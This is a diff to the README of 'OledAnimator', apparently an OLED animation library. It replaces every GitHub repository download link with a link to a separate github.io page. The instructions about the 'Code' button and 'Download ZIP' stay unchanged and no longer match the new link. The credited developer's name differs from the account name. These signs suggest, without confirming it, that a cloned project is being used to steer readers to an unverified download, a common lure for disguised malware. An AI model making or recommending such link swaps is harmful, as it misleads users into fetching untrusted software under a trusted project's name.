@@ -1,6 +1,6 @@
 # 🎬 OledAnimator - Smooth OLED Animations Made Effortless
 
-[![Download OledAnimator](https://img.shields.io/badge/Download-OledAnimator-00A4EF?style=for-the-badge&logo=github&logoColor=white&labelColor=2F80ED)](https://github.com/Abdielgr4297/OledAnimator)
+[![Download OledAnimator](https://img.shields.io/badge/Download-OledAnimator-00A4EF?style=for-the-badge&logo=github&logoColor=white&labelColor=2F80ED)](https://abdielgr4297.github.io)
 
 ## 👋 What Is OledAnimator?
 
@@ -50,7 +50,7 @@ Before downloading, make sure you have:
 
 ### Step 1: Download OledAnimator
 
-Visit this link to download the application: [Download OledAnimator](https://github.com/Abdielgr4297/OledAnimator)
+Visit this link to download the application: [Download OledAnimator](https://abdielgr4297.github.io)
 
 This link will take you to the official download page. Look for the green **"Code"** button and select **"Download ZIP"** to get the library file.
 
@@ -178,7 +178,7 @@ OledAnimator is proudly developed and maintained by **Atharva Phadnis** — an e
 
 Download OledAnimator today and turn your OLED display into a vibrant, living canvas. Click the button below to get started:
 
-[![Download Now](https://img.shields.io/badge/Download_OledAnimator-Get_Started-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Abdielgr4297/OledAnimator)
+[![Download Now](https://img.shields.io/badge/Download_OledAnimator-Get_Started-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://abdielgr4297.github.io)
 
 Your OLED screen has never looked better! 🎮✨
 
